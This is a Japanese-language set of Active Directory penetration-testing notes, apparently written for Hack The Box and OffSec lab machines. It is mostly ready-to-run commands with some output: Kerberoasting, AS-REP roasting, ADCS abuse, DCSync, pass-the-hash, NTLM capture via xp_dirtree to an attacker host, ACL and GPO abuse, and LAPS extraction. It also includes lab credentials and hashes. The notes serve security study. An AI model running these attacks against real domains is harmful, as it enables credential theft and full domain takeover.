# Active Directory

  - [AD環境の情報を取得する](#ad%E7%92%B0%E5%A2%83%E3%81%AE%E6%83%85%E5%A0%B1%E3%82%92%E5%8F%96%E5%BE%97%E3%81%99%E3%82%8B)
    - [smbclientでホスト一覧の取得](#smbclient%E3%81%A7%E3%83%9B%E3%82%B9%E3%83%88%E4%B8%80%E8%A6%A7%E3%81%AE%E5%8F%96%E5%BE%97)
    - [smbclientでノーパスログイン試行](#smbclient%E3%81%A7%E3%83%8E%E3%83%BC%E3%83%91%E3%82%B9%E3%83%AD%E3%82%B0%E3%82%A4%E3%83%B3%E8%A9%A6%E8%A1%8C)
    - [enum4linuxで列挙する](#enum4linux%E3%81%A7%E5%88%97%E6%8C%99%E3%81%99%E3%82%8B)
    - [smbmapを使用する](#smbmap%E3%82%92%E4%BD%BF%E7%94%A8%E3%81%99%E3%82%8B)
  - [cpasswordについて](#cpassword%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6)
  - [smbclientを使用してwindowsマシンに接続する](#smbclient%E3%82%92%E4%BD%BF%E7%94%A8%E3%81%97%E3%81%A6windows%E3%83%9E%E3%82%B7%E3%83%B3%E3%81%AB%E6%8E%A5%E7%B6%9A%E3%81%99%E3%82%8B)
- [impacketツール](#impacket%E3%83%84%E3%83%BC%E3%83%AB)
    - [パスワードが設定されていないユーザからTGTを入手する](#%E3%83%91%E3%82%B9%E3%83%AF%E3%83%BC%E3%83%89%E3%81%8C%E8%A8%AD%E5%AE%9A%E3%81%95%E3%82%8C%E3%81%A6%E3%81%84%E3%81%AA%E3%81%84%E3%83%A6%E3%83%BC%E3%82%B6%E3%81%8B%E3%82%89tgt%E3%82%92%E5%85%A5%E6%89%8B%E3%81%99%E3%82%8B)
    - [GetUserSPNs.py](#getuserspnspy)
  - [資格情報からLDAPを列挙する](#%E8%B3%87%E6%A0%BC%E6%83%85%E5%A0%B1%E3%81%8B%E3%82%89ldap%E3%82%92%E5%88%97%E6%8C%99%E3%81%99%E3%82%8B)
- [RPCClientツール](#rpcclient%E3%83%84%E3%83%BC%E3%83%AB)
    - [ユーザー一覧を表示する](#%E3%83%A6%E3%83%BC%E3%82%B6%E3%83%BC%E4%B8%80%E8%A6%A7%E3%82%92%E8%A1%A8%E7%A4%BA%E3%81%99%E3%82%8B)
    - [ユーザーについてより詳細に表示する](#%E3%83%A6%E3%83%BC%E3%82%B6%E3%83%BC%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6%E3%82%88%E3%82%8A%E8%A9%B3%E7%B4%B0%E3%81%AB%E8%A1%A8%E7%A4%BA%E3%81%99%E3%82%8B)
    - [グループ一覧を表示する](#%E3%82%B0%E3%83%AB%E3%83%BC%E3%83%97%E4%B8%80%E8%A6%A7%E3%82%92%E8%A1%A8%E7%A4%BA%E3%81%99%E3%82%8B)
    - [グループについてより詳細に表示する](#%E3%82%B0%E3%83%AB%E3%83%BC%E3%83%97%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6%E3%82%88%E3%82%8A%E8%A9%B3%E7%B4%B0%E3%81%AB%E8%A1%A8%E7%A4%BA%E3%81%99%E3%82%8B)
- [ADCSが動いているか確認](#adcs%E3%81%8C%E5%8B%95%E3%81%84%E3%81%A6%E3%81%84%E3%82%8B%E3%81%8B%E7%A2%BA%E8%AA%8D)
  - [脆弱な証明書テンプレート](#%E8%84%86%E5%BC%B1%E3%81%AA%E8%A8%BC%E6%98%8E%E6%9B%B8%E3%83%86%E3%83%B3%E3%83%97%E3%83%AC%E3%83%BC%E3%83%88)
    - [DC含む別のユーザを指定できる脆弱性](#dc%E5%90%AB%E3%82%80%E5%88%A5%E3%81%AE%E3%83%A6%E3%83%BC%E3%82%B6%E3%82%92%E6%8C%87%E5%AE%9A%E3%81%A7%E3%81%8D%E3%82%8B%E8%84%86%E5%BC%B1%E6%80%A7)
    - [AD内のClientを証明できる脆弱性](#ad%E5%86%85%E3%81%AEclient%E3%82%92%E8%A8%BC%E6%98%8E%E3%81%A7%E3%81%8D%E3%82%8B%E8%84%86%E5%BC%B1%E6%80%A7)
    - [新しい証明書を要求できる脆弱性](#%E6%96%B0%E3%81%97%E3%81%84%E8%A8%BC%E6%98%8E%E6%9B%B8%E3%82%92%E8%A6%81%E6%B1%82%E3%81%A7%E3%81%8D%E3%82%8B%E8%84%86%E5%BC%B1%E6%80%A7)
  - [Certifyによる証明書の要求](#certify%E3%81%AB%E3%82%88%E3%82%8B%E8%A8%BC%E6%98%8E%E6%9B%B8%E3%81%AE%E8%A6%81%E6%B1%82)
    - [オプション](#%E3%82%AA%E3%83%97%E3%82%B7%E3%83%A7%E3%83%B3)
  - [生成した鍵でkerberos認証を行う](#%E7%94%9F%E6%88%90%E3%81%97%E3%81%9F%E9%8D%B5%E3%81%A7kerberos%E8%AA%8D%E8%A8%BC%E3%82%92%E8%A1%8C%E3%81%86)
    - [証明書の作成](#%E8%A8%BC%E6%98%8E%E6%9B%B8%E3%81%AE%E4%BD%9C%E6%88%90)
    - [rubeusを使用してkerberos認証でTGTを取得し、NTLMハッシュを取得する](#rubeus%E3%82%92%E4%BD%BF%E7%94%A8%E3%81%97%E3%81%A6kerberos%E8%AA%8D%E8%A8%BC%E3%81%A7tgt%E3%82%92%E5%8F%96%E5%BE%97%E3%81%97ntlm%E3%83%8F%E3%83%83%E3%82%B7%E3%83%A5%E3%82%92%E5%8F%96%E5%BE%97%E3%81%99%E3%82%8B)
  - [Pass-the-Hash攻撃](#pass-the-hash%E6%94%BB%E6%92%83)
  - [MSSQLにアクセスする](#mssql%E3%81%AB%E3%82%A2%E3%82%AF%E3%82%BB%E3%82%B9%E3%81%99%E3%82%8B)
  - [MSSQLにアクセスした際のNTLMハッシュの取得](#mssql%E3%81%AB%E3%82%A2%E3%82%AF%E3%82%BB%E3%82%B9%E3%81%97%E3%81%9F%E9%9A%9B%E3%81%AEntlm%E3%83%8F%E3%83%83%E3%82%B7%E3%83%A5%E3%81%AE%E5%8F%96%E5%BE%97)
  - [Evil-WinRM](#evil-winrm)
    - [接続](#%E6%8E%A5%E7%B6%9A)
    - [ファイルのアップロード](#%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%81%AE%E3%82%A2%E3%83%83%E3%83%97%E3%83%AD%E3%83%BC%E3%83%89)
  - [そもそアクティブディレクトリとはなにか](#%E3%81%9D%E3%82%82%E3%81%9D%E3%82%A2%E3%82%AF%E3%83%86%E3%82%A3%E3%83%96%E3%83%87%E3%82%A3%E3%83%AC%E3%82%AF%E3%83%88%E3%83%AA%E3%81%A8%E3%81%AF%E3%81%AA%E3%81%AB%E3%81%8B)
  - [kerberos認証](#kerberos%E8%AA%8D%E8%A8%BC)
    - [kerberos認証の仕組み](#kerberos%E8%AA%8D%E8%A8%BC%E3%81%AE%E4%BB%95%E7%B5%84%E3%81%BF)

<!-- END doctoc generated TOC please keep comment here to allow auto update -->



### AD環境の情報を取得する

port: 389 ldapがopenであること

```
nmap -p 389 -n -Pn --open 10.10.11.202 --script ldap-rootdse
```

#### CrackMapExec

ActiveDirectoryに自動セキュリティアセスメントツールで、  
domain名の取得等に使える  

```
#crackmapexec smb 10.10.10.175 --shares -u '' -p ''
```

#### 匿名LDAP検索による情報ダンプ

```
# ldapsearch -x -H ldap://10.10.10.175 -b "dc=Egotistical-bank,dc=local"

パスワード情報を検索する
python3 windapsearch.py -d cascade.local --dc-ip 10.10.10.182 --full -U | grep -ie "pwd\|password" 
```

また、ここで取得できたユーザー名は、そのままだと使えない可能性があるため以下のような予測で辞書を作る  
取得例: dn: CN=Hugo Smith  

```
hsmith
hugosmith
husmith
hugos
```

#### smbclientでホスト一覧の取得

```
smbclient -N -L //IP
```

#### smbclientでアクセスする
```
smbclient -N //IP/User
```

#### smbclientでノーパスログイン試行

```
smbclient -L //<IP>/<取得したホスト名>
```

#### smbclientですべてのファイルを調べてリストを表示する  

```
smbclient //10.10.10.100/Replication -c 'recurse;ls'
```

#### smbclientでアクセスできたユーザーファイルをマウントする
```
mount -t cifs //10.10.10.192/profiles$ /mnt

ユーザーとパスワード、ディレクトリを指定する場合
sudo mount -t cifs -o 'username=audit2020,password=0xdf!!!' //10.10.10.192/forensic /mnt
```


#### enum4linuxで列挙する

``` enum4linux 10.10.10.100 ```

#### smbmapを使用する

``` smbmap -H 10.10.10.100 ```

ユーザーの列挙
```
smbmap -H 10.10.10.192 -u null
```

ファイルのダウンロード
```
smbmap -r Replication -H 10.10.10.100 -A Groups.xml -q
```

**また、ユーザー名、パスワードが入手できていれば以下のコマンドでユーザー内にあるディレクトリを狙い撃ちで表示できるほか、  
パスワードがないと表示されないディレクトリも表示されたりされなかったり**  

```
smbmap -H 10.10.10.100 -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18
```

### cpasswordについて
cpasswordはWindows 2008 Group Policy Preferences（GPP）を介してAESで暗号化されているため  
gpp-decryptを使用して復号する

```
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
```

### smbclientを使用してwindowsマシンに接続する
```
smbclient //アクセスしたいマシンのディレクトリ -U アクセスするユーザーとパスワード
smbclient //10.10.10.100/Users -U active.htb\\SVC_TGS%GPPstillStandingStrong2k18
```

なお、ターゲットのディレクトリ名はsmbmapで探索、列挙することで発見できる。

既にユーザー名とパスワードが割れている場合は、psexec.pyで接続することもできる  

```
psexec.py administrator:Ticketmaster1968@active.htb
```

## impacketツール

#### パスワードが設定されていないユーザからTGTを入手する

このスクリプトは、以下のプロパティを持つユーザーのTGTのリストと取得を試みる  
'Kerberosの事前認証を要求しない' (UF_DONT_REQUIRE_PREAUTH)が設定されているユーザーのTGTのリストと取得を試みる  
このような設定を持つユーザーに対しては、John The Ripperの出力が生成される  

パスワードを指定しないでGetNPUsersを回す

```
GetNPUsers.py -no-pass -dc-ip 10.10.10.161 htb/${user}

python3 GetNPUsers.py -dc-ip 10.10.10.161 -request 'htb.local/'
```

ユーザー名を列挙したファイルからブルートフォースで取得する
```
$for user in $(cat ~/users); do python3 GetNPUsers.py -no-pass -dc-ip 10.10.10.192 -request blackfield.local/$user | grep krb5asrep; done
```

#### GetUserSPNs.py
通常のユーザー アカウントに関連付けられているサービス ユーザー名のリストを取得できる。  
また、チケットもブルートフォースが成功すれば入手できる

```
GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS -save -outputfile GetUserSPNs.out

python3 GetUserSPNs.py hokkaido-aerospace.com/discovery:'Start123!' -dc-ip 192.168.121.40 -request
```

入手したハッシュ化されたケルベロス認証チケットをhashcatで解読する、  
13100というのはhashcatの解読モードのことで、13100は、ケルベロス認証用で、
18200はkrb5asrepで使う  
どの数値が何用かは以下のページで確認できる  

```
https://hashcat.net/wiki/doku.php?id=example_hashes
```

```
hashcat -m 13100 -a 0 GetUserSPNs.out /usr/share/wordlists/rockyou.txt --force
```

#### impakcet-smbserverを利用したファイル転送
windowsでファイル転送する時によく用いられる

```
攻撃側
$ impacket-smbserver please $(pwd) -smb2support -user test -password helloworld


やられ側
C:> $pass = convertto-securestring 'helloworld' -AsPlainText -Force
C:> $cred = New-Object System.Management.Automation.PSCredential('test',$pass)

C:> New-PSDrive -Name test -PSProvider FileSystem -Credential $cred -Root \\自分のIP\please
C:>.\winPEAS64.exe
```

#### impacket-mssqlclient

```
impacket-mssqlclient 'hokkaido-aerospace.com/discovery':'Start123!'@192.168.121.40 -dc-ip 192.168.121.40 -windows-auth
```

#### impacket-mssqlclient内の操作方法

```
データベースを列挙する
SELECT name FROM master..sysdatabases;
もしくは
enum_db

データベース(hrappdb)にアクセスする
use hrappdb

偽装できるユーザーを列挙する
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'

偽装できるユーザーでログインする
EXECUTE AS LOGIN = 'hrappdb-reader'

(drappdbというデータベースのテーブル)テーブルを列挙する
SELECT * FROM hrappdb.INFORMATION_SCHEMA.TABLES;

テーブル(sysauthテーブル)内の情報を列挙する
select * from sysauth;
```


  ### MSSQLにアクセスする(impacket-mssqlclient)
  impacketのツールを使う

  ```
# impacket-mssqlclient <target domain>/<Username>:<Password>@<IP>
```

  ### MSSQLにアクセスした際のNTLMハッシュの取得
  MSSQLに再接続する際の通信をキャプチャすることでハッシュを取得し、ハッシュを解読することでパスワードを取得できる。  
  自分の端末でresponderを使用してキャプチャする  
  ```
  sudo responder -I tun0
  ```


  やられ側
  ``` xp_dirtree ``` や ``` xp_cmdshell ``` を使用して実行する
  ```
 SQL> EXEC xp_dirtree '\\<自分のIP>\'
  ```
なお、SQLから侵入した場合は、SQLのLogを漁ることでヒントを見つけることができる 

### 資格情報からLDAPを列挙する

LDAPプロトコルからAD内のユーザー情報を列挙できる  
ldapsearch,ldapdomaindump  

```
# ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
ldapsearch -x -H ldap://dc.support.htb -D 'SUPPORT\ldap' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "CN=Users,DC=SUPPORT,DC=HTB" | tee ldap_dc.support.htb.txt
ldapdomaindump -u 'support\ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' dc.support.htb
```

#### ldapsearchの結果からグループ名やユーザー名を絞る

```
$ ldapsearch -x -H ldap://10.10.10.161 -b "DC=htb,DC=local" > ldap-anonymous.out

グループ名に絞る
$ cat ldap-anonymous.out| grep -i memberof

ユーザー名に絞る
$ cat ldap-anonymous.out| grep -i user

オブジェクトクラスがPersonの物のみダンプする
$ ldapsearch -H ldap://10.10.10.161 -x -b "DC=htb,DC=local" '(objectClass=Person)'

```

### kerbruteを使用して、AS-REPローストできるアカウントを探す  

```
python3 kerbrute.py -users ./user.txt -dc-ip 10.10.10.175 -domain Egotistical-bank.local
```


## RPCClientツール

TCPポート445番が開いている場合に使用できる 
また、RPCClientで列挙できたユーザーはGetNPUsers.pyでハッシュを入手することができる可能性がある  
特に、ldapででてこなかったユーザーとかは怪しい  


アノニマスログインを行う  

```
# rpcclient -U "" -N 10.10.10.161
```
  
#### ユーザー一覧を表示する

```
rpcclient $> enumdomusers
```

#### ユーザーについてより詳細に表示する

```
rpcclient $> queryuser 0x1f4
```

#### グループ一覧を表示する

```
rpcclient $> enumdomgroups
```

#### グループについてより詳細に表示する

```
rpcclient $> querygroup 0x200
rpcclient $> querygroupmem 0x200
```

## ADCSが動いているか確認

``` ps ```コマンドを実行し、``` certsrv ```があれば、  
ActiveDirectory証明書サービス(ADCS)が動いている  
→Certifyで証明書が緩い設定のところを探すことができる  


### 脆弱な証明書テンプレート

#### DC含む別のユーザを指定できる脆弱性

この証明書テンプレートに基づいて新しい証明書を要求しているユーザーが、  
別のユーザー(ドメイン管理者ユーザーを含む任意のユーザー)の証明書を要求できることを示す  

```
msPKI-Certificate-Name-Flag: ENROLLEE_SUPPLIES_SUBJECT
```

#### AD内のClientを証明できる脆弱性

Client Authenticationに注目する。  
この証明書テンプレートから生成される証明書を使って、AD内のClientを証明できる    


```
pkiextendedkeyusage: Client Authentication, Encrypting File System, Secure Email
```

#### 新しい証明書を要求できる脆弱性

AD内の認証されたユーザーが、この証明書テンプレートに基づいて生成される  
新しい証明書を要求できることを示している。  

```
Enrollment Rights: NT Authority\Authenticated Users
```


### Certifyによる証明書の要求  

#### オプション
``` /ca ``` - リクエスト送信先となる認証局サーバーを指定する  

``` /template ``` - 新しい証明書の生成に使用する証明書テンプレートを指定する  

``` /altname ``` - 新しい証明書を生成する必要があるADユーザーを指定する  


 ```
certify.exe request /ca:<$certificateAuthorityHost> /template:<$vulnerableCertificateTemplateName> /altname:<$adUserToImpersonate>
```

### 生成した鍵でkerberos認証を行う

#### 証明書の作成
cert.pemとprivate.keyを作成していることが前提  
出力形式はpfx形式にする

```
openssl pkcs12 -in cert.pem -inkey private.key -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```
#### rubeusを使用してkerberos認証でTGTを取得し、NTLMハッシュを取得する
``` /getcredentials ```オプションでNTLMハッシュを取得できる  

```
.\Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /getcredentials /password:<pfxを生成した際に設定したパスワード>
```

  ### Pass-the-Hash攻撃
  パスワードハッシュ値を平文に戻すことなく認証を実行する手法  
  →NTLMハッシュ値のみでNet-NTLMv2応答値を生成して認証することが可能  

  ### Overpass-the-Hash攻撃
  基本的には、Pass-the-Hashと同じ原理の攻撃手法ではあるが、以下の利点がある  
• Pass-the-Hash は推奨されていない Net-NTLMv2 認証を利用するため、セキュリティ製品に気づかれやすいという特徴があったが、  
Overpass-the-Hash は通常の Kerberos 認証を利用するため、より見つかりにくい性質を持つ  
• NT ハッシュは取得できたが、目的のリソースにアクセスする際に  
Kerberos 認証を利用する必要があるケースで役立つ   

### Evil-WinRM
Evil-WinRMツールを介することで、  
リモートのWindowsサーバーで稼働しているWinRMサービスに接続することができ、  
インタラクティブなPowerShellを取得することができる  

#### 接続

ユーザーとパスワードで接続  

```
# evil-winrm -i 10.10.11.202 -u sql_svc -p REGGIE1234ronnie
```

NTLMハッシュを用いて接続  

```
# evil-winrm -i 10.10.11.202 -u Administrator -H <ハッシュ値>
```

#### ファイルのアップロード

```
upload <アップしたいファイルのパス>
```

  
  ### そもそアクティブディレクトリとはなにか  
  組織のシステムを管理するやつ  
  
  以下のサイトがわかりやすい  
  https://www.sbbit.jp/article/cont1/37798

  ### kerberos認証

  ケルベロス（Kerberos）認証はネットワーク認証手段の一つで、サーバーとクライアント間の身元確認のために利用されるプロトコル  
  クライアントとサーバーを相互に認証して、通信を保護するためにサーバーとクライアント間の通信を暗号化する。  

  ケルベロス認証では1度ログインすると次回のログイン時にID/パスワードを再度入力する必要がない  

  また、TGTはAS-REQとも呼ばれる

  #### kerberos認証の仕組み  

  

| 用語 | 説明                                                                  | 
| ---- | --------------------------------------------------------------------- | 
| KDC  | サーバーとユーザーに関する情報を<br>一元管理するDB                    | 
| AS   | ユーザーからの認証を受け付ける<br>認証サーバー                        | 
| TGS  | KDCに登録されたサーバーを利用する<br>ためのチケットを発行するサーバー | 
| TGT  | チケット発行のもととなるチケット                                      | 

  
  1. ASに対してユーザー認証情報を送信
  2. KDCによってユーザー情報とサーバー利用資格をチェック
  3. 問題なければASからTGTチケットを払いだす
  4. TGTチケットをTGSに送信し、利用したいサーバー用のチケットを要求
  5. TGSから利用したいサーバー用のチケットを発行
  6. 利用したいサーバーに対して、TGSから発行されたチケットを送信
  7. チケットに問題がなければサーバーが利用可能となる


### 他グループに所属しているアカウントの侵害
仮にEXCHANGE WINDOWS PERMISSIONSグループにAdminがあるが、自分が侵害したアカウントは別グループである場合は、  
EXCHANGE WINDOWS PERMISSIONSグループからGenericAllを付与されている場合は、ユーザーを作成してそのグループに加入  
以下は、ドメインユーザーにNTDS.ditというDC SYNCを渡すために、必要なクレデンシャル情報などを作成  
これにより、wackerにNTDS.dit(DC SYNC)が渡される  

```
$passwd = convertto-securestring 'password' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('htb\wacker', $passwd)
Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity wacker -Rights DCSync
```

ここで、secretdump.pyを実行することで、NTLMハッシュをダンプできる。

```
impacket-secretsdump htb.local/wacker:password@10.10.10.161
```

NTLMハッシュを取得したら以下で接続
```
./psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 administrator@10.10.10.161

evil-winrm -i 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
```



### AS-REP Roasting
ADのリソースにアクセスするためには、ユーザはまずDCに存在するKDC（Key Distribution Center）からTGT（Ticket Granting Ticket）を要求することになります。  

TGTを要求（AS-REQと呼ばれる）するために、ユーザは「自身のNTハッシュを利用してタイムスタンプを暗号化したもの」を含めて送信します。  

KDCはこの暗号化されたタイムスタンプを受け取ると、あらかじめ保持しているそのユーザのNTハッシュを使ってタイムスタンプの復号をし、比較します。  
比較して問題がなければユーザにTGTを発行します（AS-REPと呼ばれる）。  

ただし、デフォルトでは有効になっている事前認証（自身のNTハッシュを利用してタイムスタンプを暗号化するステップ）を無効に設定することもできます。  

これにより、事前認証が不要なユーザカウントの場合パスワードを知らなくてもTGTをリクエストでき、TGTを受け取ったらオフラインクラックをすることでパスワードを特定することが可能となります。  
TGTにはクライアントのパスワードが元になって暗号化されたデータがあるので、そのデータをオフラインクラックするイメージです。  


### DCSync
ユーザー名パスワードが漏れている状態でBloodHound等でDCSync攻撃ができると分かった場合

```
$ python3 secretsdump.py 'svc_loanmgr:Moneymakestheworldgoround!@10.10.10.175'

侵害したユーザーにmimikatzを使う場合
$ .\mimikatz.exe 'lsadump::dcsync /domain:EGOTISTICAL-BANK.LOCAL /user:Administrator' exit

```

ここで取得したハッシュを使用して接続

```
wmiexec.py -hashes '[アカウント?ハッシュ]:[NTLMハッシュ]' -dc-ip 10.10.10.175 administrator@10.10.10.175
```

https://0xdf.gitlab.io/2020/07/18/htb-sauna.html

### Mimikatzでlsassをメモリダンプしてクレデンシャル情報を取得する  
pypykatzを使用してメモリダンプする
```
pip3 install pypykatz

pypykatz lsa minidump lsass.DMP(ダンプするファイル)
```


## 主なActive Directoryへの攻撃手法
  
Abusing ACLs/ACEs  
Kerberoasting  
AS-REP Roasting  
Abuse DnsAdmins  
Password in Object Description  
User Objects With Default password (Changeme123!)  
Password Spraying  
DCSync  
Silver Ticket  
Golden Ticket  
Pass-the-Hash  
Pass-the-Ticket  
SMB Signing Disabled  

### ACL/ACE の悪用
  
https://github.com/blackc03r/OSCP-Cheatsheets/blob/master/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces.md
  
このラボでは、Active Directory の任意アクセス制御リスト (DACL) と、DACL を構成するアクセス制御エントリ (ACE) の弱い権限を悪用します。  
ユーザーやグループなどの Active Directory オブジェクトはセキュリティ保護可能なオブジェクトであり、DACL/ACE はそれらのオブジェクトを読み取り/変更できるユーザーを定義します (アカウント名の変更、パスワードのリセットなど)。  

#### Active Directory オブジェクトの権限とタイプの一部
  
```
GenericAll - オブジェクトに対する完全な権限（ユーザーをグループに追加したり、ユーザーのパスワードをリセットする）
GenericWrite - オブジェクトの属性を更新します (ログオン スクリプトなど)
WriteOwner - オブジェクトの所有者を攻撃者が制御するユーザーに変更し、オブジェクトを乗っ取る
WriteDACL - オブジェクトの ACE を変更し、攻撃者にオブジェクトに対する完全な制御権を与える
AllExtendedRights - ユーザーをグループに追加したり、パスワードをリセットしたりする機能
ForceChangePassword - ユーザーのパスワードを変更する機能
Self (Self-Membership) - 自分自身をグループに追加する機能
AddMembers:ユーザー (自分のアカウントを含む)、グループ、またはコンピューターを対象グループに追加できる

AllowedToDelegate msds-AllowedToDelegateToというサービスに対してドメイン ユーザーに代わって操作することを許可されている
```

### GenericAllが付与されている場合

#### ユーザーがGenericAllの権限を持っているかチェックする
  
powerviewを使って、攻撃しているユーザーspotlessが、ユーザーdelegate君のADオブジェクトに対してGenericAllの権限を持っているかどうかをチェックする  

```
以下を実行して、ActiveDirectoryRights属性がGenericAllかどうかを確認する
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.ActiveDirectoryRights -eq "GenericAll"}  
```

#### GenericAll権限を使用してパスワードを変更する

```
spotlessユーザー(自身)からdelegateユーザーのパスワードをdelegateに変更する
net user delegate delegate /domain
```

#### GenericAll権限のあるアカウントから同じグループに所属しているアカウントのパスワードを強制変更する

```
hrapp-service(pwn済)がtier2adminであるHazel.Greenユーザーに対してgenericWrite権限を持っていて、
tier2adminグループからForceChangePasswordで同じグループに所属するMOLLY.SMITHに対して強制パスワード変更を行う

まず、ユーザーを指名して、kerberoastを行えるtargetedKerberoast.pyを実行してkrb5tgsを取得する
targetedKerberoast.py -v -d 'hokkaido-aerospace.com' -u 'hrapp-service' -p 'Untimed$Runny' --dc-ip 192.168.208.40

パスワードをhashcatでクラックしたらrpcclient経由でMOLLY.SMITHのパスワードを強制変更する
rpcclient -N  192.168.208.40 -U 'hazel.green%haze1988'
$> setuserinfo2 MOLLY.SMITH 23 'Password123!'

そうすればRDP接続を行える
xfreerdp /u:molly.smith /p:'Password123!' /v:192.168.208.40 +clipboard
```

#### グループでGenericAllできるか確認する

まずは、distinguishedName属性の値を確認する必要がある
```
以下でdistinguishedName属性の値を確認する
Get-NetGroup "domain admins" -FullData
例: distinguishName: CN~Domain Admins,CN=Users,DC=offense,DC=local

この情報からグループにGenericAllがあるかどうかを確認する
 Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local"}
```

#### GenericAllを使用して、自分自身をグループに追加する

```
これで自分自身（spotlessユーザー）をDomain Adminグループに追加できる：
net group "domain admins" spotless /add /domain

同様のコマンドをActiveDirectoryモジュールやPowerSploitを使用して実行できる
# with active directory module
Add-ADGroupMember -Identity "domain admins" -Members spotless

# with Powersploit
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```

### GenericWriteでGPOに自信を追加して権限昇格

```
例として、自身(Anirudh)がDefault Domain Policyに対してGenericWriteが付与されている場合
SharpGPOAbuse.exe(pyGPOAbuse.py)を使ってGPOに自信を追加する

*Evil-WinRM* PS C:\Users\anirudh\Documents> cmd.exe /c .\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount anirudh --GPOName "Default Domain Policy"

[+] Domain = vault.offsec
[+] Domain Controller = DC.vault.offsec
[+] Distinguished Name = CN=Policies,CN=System,DC=vault,DC=offsec
[+] SID Value of anirudh = S-1-5-21-537427935-490066102-1511301751-1103
[+] GUID of "Default Domain Policy" is: {31B2F340-016D-11D2-945F-00C04FB984F9}
[+] File exists: \\vault.offsec\SysVol\vault.offsec\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
[+] The GPO does not specify any group memberships.
[+] versionNumber attribute changed successfully
[+] The version number in GPT.ini was increased successfully.
[+] The GPO was modified to include a new local admin. Wait for the GPO refresh cycle.
[+] Done!
*Evil-WinRM* PS C:\Users\anirudh\Documents> gpupdate /force

再度psexec経由でログインするとadminになっている
(SharpGPOAbuseが成功していれば、psexecが使用できるようになっている)
└─$ impacket-psexec vault.offsec/anirudh:SecureHM@192.168.192.172
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 192.168.192.172.....
[*] Found writable share ADMIN$
[*] Uploading file VkgAqKoW.exe
[*] Opening SVCManager on 192.168.192.172.....
[*] Creating service TPGD on 192.168.192.172.....
[*] Starting service TPGD.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.2300]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> 


```

### WritePropertyが付与されている場合

```
以下のコマンドを実行して、ActiveDrectoryRightsがWritePropertyであることを確認する
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
```

#### WritePropertyで自分自身でグループに追加する

```
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```

### Self (Self-Membership)が付与されている場合

```
以下のコマンドを実行して、ObjectType属性がSelf-Membershipであることを確認する
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
```

#### 自分自身をグループに追加する(Self (Self-Membership)が付与されている場合)

```
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```

### WriteProperty (Self-Membership)が付与されている場合

```
以下のコマンドを実行して、ObjectType属性がSelf-Membershipで、ActiveDirectoryRights属性がWritePropertyであることを確認する
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
```

#### 自分自身をグループに追加する(WriteProperty (Self-Membership)が付与されている場合)

```
net group "domain admins" spotless /add /domain
```


### ReadLAPSPasswordが付与されている場合のパスワード取得

```
└─$ python3 pyLAPS.py --action get -d "hutch.offsec" -u "fmcsorley" -p "CrabSharkJellyfish192" --dc-ip 192.168.192.122
                 __    ___    ____  _____
    ____  __  __/ /   /   |  / __ \/ ___/
   / __ \/ / / / /   / /| | / /_/ /\__ \   
  / /_/ / /_/ / /___/ ___ |/ ____/___/ /   
 / .___/\__, /_____/_/  |_/_/    /____/    v1.2
/_/    /____/           @podalirius_           
    
[+] Extracting LAPS passwords of all computers ... 
  | HUTCHDC$             : $s5+7&gb+v9TFE
[+] All done!

```


### WriteDACL権限からDCSyncを実行する

```
ownしたユーザーがaccount operatoesグループに所属していて、
account operatorsがexchange windows permissionsグループに対してgeneric allがある
そしてexchange windows permissionsグループはhtb.localに対してwriteDACLができる
→writeDACLはDCSyncすることができる

zeus:passwordを追加する
net user zeus password /add /domain
or
net user zeus password /add

ユーザーが作成されたことを確認する
net users /domain

ユーザーをExchange Windowsグループに対して許可を追加する
net group "Exchange Windows Permissions" /add zeus

グループに追加されたことを確認する
net user zeus

最後にDCSync権限を付与する
$pass = convertto-securestring 'password' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('htb\zeus', $pass)
